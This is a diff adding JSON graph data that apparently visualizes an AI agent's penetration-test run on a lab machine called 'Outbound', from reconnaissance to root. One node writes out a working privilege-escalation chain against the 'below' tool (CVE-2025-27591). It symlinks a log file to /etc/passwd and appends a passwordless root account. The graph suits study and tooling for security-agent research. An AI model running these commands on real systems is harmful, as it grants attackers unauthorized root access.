+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 9.2:\n\u2713 1 Reconnaissance\n\u2713 2 Web application analysis\n\u2713 3 Vulnerability research\n\u2713 4 Initial exploitation\n\u2713 5 Lateral movement\n\u2713 6 Password decryption\n\u2713 7 Mail access\n\u2713 8 SSH access\n\u2713 9 Privilege escalation enumeration\n  \u2713 9.1 Sudo privileges check\n  \u2713 9.2 Application analysis\n\u25cb 10 Vulnerability exploitation\n  \u25cb 10.1 CVE research",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s10_10",
+      "label": "Search: 10\nVulnerability exploitation",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 10: Vulnerability exploitation\n\nMCP tool calls:\nInteractive CLI: Execute sudo -l to check Jacob's sudo privileges. Document allowed commands and restrictions. Examine /opt for custom applications. Check file permissions on any discovered binaries.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s10_10",
+      "label": "Track: Vulnerability exploitation",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "10 Vulnerability exploitation:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s10_10",
+      "label": "Agent: 10\nVulnerability exploit\u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 10:\n\u2713 1 Reconnaissance\n\u2713 2 Web application analysis\n\u2713 3 Vulnerability research\n\u2713 4 Initial exploitation\n\u2713 5 Lateral movement\n\u2713 6 Password decryption\n\u2713 7 Mail access\n\u2713 8 SSH access\n\u2713 9 Privilege escalation enumeration\n  \u2713 9.1 Sudo privileges check\n  \u2713 9.2 Application analysis\n\u25cb 10 Vulnerability exploitation\n  \u25cb 10.1 CVE research",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s10_10.1",
+      "label": "Search: 10.1\nCVE research",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 10.1: CVE research\n\nMCP tool calls:\nInteractive CLI: Execute sudo -l to check Jacob's sudo privileges. Document allowed commands and restrictions. Examine /opt for custom applications. Check file permissions on any discovered binaries.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s10_10.1",
+      "label": "Track: CVE research",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "10.1 CVE research:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s10_10.1",
+      "label": "Agent: 10.1\nVulnerability exploit\u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 10.1:\n\u2713 1 Reconnaissance\n\u2713 2 Web application analysis\n\u2713 3 Vulnerability research\n\u2713 4 Initial exploitation\n\u2713 5 Lateral movement\n\u2713 6 Password decryption\n\u2713 7 Mail access\n\u2713 8 SSH access\n\u2713 9 Privilege escalation enumeration\n  \u2713 9.1 Sudo privileges check\n  \u2713 9.2 Application analysis\n\u25cb 10 Vulnerability exploitation\n  \u25cb 10.1 CVE research",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s11_10.2",
+      "label": "Search: 10.2\nSymlink attack",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 10.2: Symlink attack\n\nMCP tool calls:\nGoogle search: Search for 'below 0.8.0 CVE privilege escalation vulnerability symlink file permissions'. Research security advisories for this version.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s11_10.2",
+      "label": "Track: Symlink attack",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "10.2 Symlink attack:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s11_10.2",
+      "label": "Agent: 10.2\nVulnerability exploit\u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 10.2:\n\u2713 1 Reconnaissance\n\u2713 2 Web application analysis\n\u2713 3 Vulnerability research\n\u2713 4 Initial exploitation\n\u2713 5 Lateral movement\n\u2713 6 Password decryption\n\u2713 7 Mail access\n\u2713 8 SSH access\n\u2713 9 Privilege escalation enumeration\n\u25cb 10 Vulnerability exploitation\n  \u2713 10.1 CVE research\n  \u25cb 10.2 Symlink attack",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Outbound:r1_s12_10.3",
+      "label": "Search: 10.3\nRoot access",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 10.3: Root access\n\nMCP tool calls:\nInteractive CLI: Delete /var/log/below/error_root.log. Create symlink: ln -sf /etc/passwd /var/log/below/error_root.log. Execute sudo below to trigger CVE-2025-27591. Add root entry: echo 'oxdf::0:0:oxdf:/root:/bin/bash' >> /etc/passwd. Switch user: su - oxdf",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Outbound:r1_s12_10.3",
+      "label": "Track: Root access",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "10.3 Root access:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_s12_10.3",
+      "label": "Agent: 10.3\nVulnerability exploit\u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 10.3:\n\u2713 1 Reconnaissance\n\u2713 2 Web application analysis\n\u2713 3 Vulnerability research\n\u2713 4 Initial exploitation\n\u2713 5 Lateral movement\n\u2713 6 Password decryption\n\u2713 7 Mail access\n\u2713 8 SSH access\n\u2713 9 Privilege escalation enumeration\n\u2713 10 Vulnerability exploitation\n  \u2713 10.1 CVE research\n  \u2713 10.2 Symlink attack\n  \u2713 10.3 Root access",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Outbound:r1_close",
+      "label": "Agent: Task\nComplete (Goal)",
+      "type": "Agent",
+      "color": "#FF006E",
+      "title": "Final cumulative PTT for this run:\n\u2713 1 Reconnaissance\n\u2713 2 Web application analysis\n\u2713 3 Vulnerability research\n\u2713 4 Initial exploitation\n\u2713 5 Lateral movement\n\u2713 6 Password decryption\n\u2713 7 Mail access\n\u2713 8 SSH access\n\u2713 9 Privilege escalation enumeration\n\u2713 10 Vulnerability exploitation\n  \u2713 10.1 CVE research\n  \u2713 10.2 Symlink attack\n  \u2713 10.3 Root access",
+      "size": 46,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    }
+  ],
+  "edges": [
+    {
+      "from": "agent:Outbound:START",
+      "to": "agent:Outbound:r1_s1_2",
+      "label": "\u2192 2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:START",
+      "to": "search:Outbound:r1_s1_2",
+      "label": "2 Web application ana\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s1_2",
+      "to": "track:Outbound:r1_s1_2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s1_2",
+      "to": "agent:Outbound:r1_s1_2",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s1_2",
+      "to": "agent:Outbound:r1_s1_2.1",
+      "label": "\u2192 2.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s1_2",
+      "to": "search:Outbound:r1_s1_2.1",
+      "label": "2.1 Service identificat\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s1_2.1",
+      "to": "track:Outbound:r1_s1_2.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s1_2.1",
+      "to": "agent:Outbound:r1_s1_2.1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s1_2.1",
+      "to": "agent:Outbound:r1_s2_2.2",
+      "label": "\u2192 2.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s1_2.1",
+      "to": "search:Outbound:r1_s2_2.2",
+      "label": "2.2 Authentication test\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s2_2.2",
+      "to": "track:Outbound:r1_s2_2.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s2_2.2",
+      "to": "agent:Outbound:r1_s2_2.2",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s2_2.2",
+      "to": "agent:Outbound:r1_s2_3",
+      "label": "\u2192 3",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s2_2.2",
+      "to": "search:Outbound:r1_s2_3",
+      "label": "3 Vulnerability resea\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s2_3",
+      "to": "track:Outbound:r1_s2_3",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s2_3",
+      "to": "agent:Outbound:r1_s2_3",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s2_3",
+      "to": "agent:Outbound:r1_s2_3.1",
+      "label": "\u2192 3.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s2_3",
+      "to": "search:Outbound:r1_s2_3.1",
+      "label": "3.1 CVE identification",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s2_3.1",
+      "to": "track:Outbound:r1_s2_3.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s2_3.1",
+      "to": "agent:Outbound:r1_s2_3.1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s2_3.1",
+      "to": "agent:Outbound:r1_s3_4",
+      "label": "\u2192 4",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s2_3.1",
+      "to": "search:Outbound:r1_s3_4",
+      "label": "4 Initial exploitation",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s3_4",
+      "to": "track:Outbound:r1_s3_4",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s3_4",
+      "to": "agent:Outbound:r1_s3_4",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s3_4",
+      "to": "agent:Outbound:r1_s3_4.1",
+      "label": "\u2192 4.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s3_4",
+      "to": "search:Outbound:r1_s3_4.1",
+      "label": "4.1 Deserialization RCE",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s3_4.1",
+      "to": "track:Outbound:r1_s3_4.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s3_4.1",
+      "to": "agent:Outbound:r1_s3_4.1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s3_4.1",
+      "to": "agent:Outbound:r1_s4_4.2",
+      "label": "\u2192 4.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s3_4.1",
+      "to": "search:Outbound:r1_s4_4.2",
+      "label": "4.2 Shell establishment",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s4_4.2",
+      "to": "track:Outbound:r1_s4_4.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s4_4.2",
+      "to": "agent:Outbound:r1_s4_4.2",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s4_4.2",
+      "to": "agent:Outbound:r1_s5_5",
+      "label": "\u2192 5",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s4_4.2",
+      "to": "search:Outbound:r1_s5_5",
+      "label": "5 Lateral movement",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s5_5",
+      "to": "track:Outbound:r1_s5_5",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s5_5",
+      "to": "agent:Outbound:r1_s5_5",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s5_5",
+      "to": "agent:Outbound:r1_s5_5.1",
+      "label": "\u2192 5.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s5_5",
+      "to": "search:Outbound:r1_s5_5.1",
+      "label": "5.1 Database enumeration",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s5_5.1",
+      "to": "track:Outbound:r1_s5_5.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s5_5.1",
+      "to": "agent:Outbound:r1_s5_5.1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s5_5.1",
+      "to": "agent:Outbound:r1_s6_5.2",
+      "label": "\u2192 5.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s5_5.1",
+      "to": "search:Outbound:r1_s6_5.2",
+      "label": "5.2 Password extraction",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s6_5.2",
+      "to": "track:Outbound:r1_s6_5.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s6_5.2",
+      "to": "agent:Outbound:r1_s6_5.2",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s6_5.2",
+      "to": "agent:Outbound:r1_s6_6",
+      "label": "\u2192 6",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s6_5.2",
+      "to": "search:Outbound:r1_s6_6",
+      "label": "6 Password decryption",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s6_6",
+      "to": "track:Outbound:r1_s6_6",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s6_6",
+      "to": "agent:Outbound:r1_s6_6",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s6_6",
+      "to": "agent:Outbound:r1_s6_6.1",
+      "label": "\u2192 6.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s6_6",
+      "to": "search:Outbound:r1_s6_6.1",
+      "label": "6.1 Credential recovery",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s6_6.1",
+      "to": "track:Outbound:r1_s6_6.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s6_6.1",
+      "to": "agent:Outbound:r1_s6_6.1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s6_6.1",
+      "to": "agent:Outbound:r1_s7_7",
+      "label": "\u2192 7",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s6_6.1",
+      "to": "search:Outbound:r1_s7_7",
+      "label": "7 Mail access",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s7_7",
+      "to": "track:Outbound:r1_s7_7",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s7_7",
+      "to": "agent:Outbound:r1_s7_7",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s7_7",
+      "to": "agent:Outbound:r1_s7_7.1",
+      "label": "\u2192 7.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s7_7",
+      "to": "search:Outbound:r1_s7_7.1",
+      "label": "7.1 Email enumeration",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s7_7.1",
+      "to": "track:Outbound:r1_s7_7.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s7_7.1",
+      "to": "agent:Outbound:r1_s7_7.1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s7_7.1",
+      "to": "agent:Outbound:r1_s8_8",
+      "label": "\u2192 8",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s7_7.1",
+      "to": "search:Outbound:r1_s8_8",
+      "label": "8 SSH access",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s8_8",
+      "to": "track:Outbound:r1_s8_8",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s8_8",
+      "to": "agent:Outbound:r1_s8_8",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s8_8",
+      "to": "agent:Outbound:r1_s8_8.1",
+      "label": "\u2192 8.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s8_8",
+      "to": "search:Outbound:r1_s8_8.1",
+      "label": "8.1 Host authentication",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s8_8.1",
+      "to": "track:Outbound:r1_s8_8.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s8_8.1",
+      "to": "agent:Outbound:r1_s8_8.1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s8_8.1",
+      "to": "agent:Outbound:r1_s9_9",
+      "label": "\u2192 9",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s8_8.1",
+      "to": "search:Outbound:r1_s9_9",
+      "label": "9 Privilege escalatio\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s9_9",
+      "to": "track:Outbound:r1_s9_9",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s9_9",
+      "to": "agent:Outbound:r1_s9_9",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s9_9",
+      "to": "agent:Outbound:r1_s9_9.1",
+      "label": "\u2192 9.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s9_9",
+      "to": "search:Outbound:r1_s9_9.1",
+      "label": "9.1 Sudo privileges che\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s9_9.1",
+      "to": "track:Outbound:r1_s9_9.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s9_9.1",
+      "to": "agent:Outbound:r1_s9_9.1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s9_9.1",
+      "to": "agent:Outbound:r1_s10_9.2",
+      "label": "\u2192 9.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s9_9.1",
+      "to": "search:Outbound:r1_s10_9.2",
+      "label": "9.2 Application analysis",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s10_9.2",
+      "to": "track:Outbound:r1_s10_9.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
